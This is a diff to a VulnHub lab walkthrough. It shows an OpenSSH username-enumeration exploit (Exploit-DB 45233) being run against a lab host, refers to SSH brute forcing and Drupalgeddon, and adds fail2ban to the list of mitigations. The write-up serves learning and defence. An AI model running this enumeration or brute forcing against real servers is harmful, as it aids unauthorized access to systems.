@@ -37,12 +37,12 @@ On accessing the Drupal site, we can see that the there are two articles written
   <img src="https://github.com/gameFace22/vulnhub-walkthrough/blob/master/images/username-lamp.png">
 </p>
 
-Recently there was an [exploit](https://www.exploit-db.com/exploits/45233/) released for OpenSSH 2.3 < 7.7 which checks if the username is valid or not. We can use that to verify if these two are valid users. 
+Recently there was an [exploit](https://www.exploit-db.com/exploits/45233/) released for OpenSSH 2.3 < 7.7 which checks if the username is valid or not. We can use that to verify if these two are valid and bruteforce if needed. 
 
 ```
 $  python 45233.py --port 22 --username Eder 192.168.0.107
 Eder is not a valid user!
-› python 45233.py --port 22 --username tiago 192.168.0.107
+$ python 45233.py --port 22 --username tiago 192.168.0.107
 tiago is a valid user!
 ```
 
@@ -124,6 +124,7 @@ We can ssh as the root user with the modified password.
 [1] Firewall/IDS/IPS rule to detect signature of druppalgeddon and block it. <br>
 [2] Disable access to sensitive files like CHANGELOG.txt. <br>
 [3] Limit the ACL for uploading, executing files in the OS level or Server level. 
+[4] Implement services like fail2ban to prevent SSH bruteforce. 
 
 ## References 
 
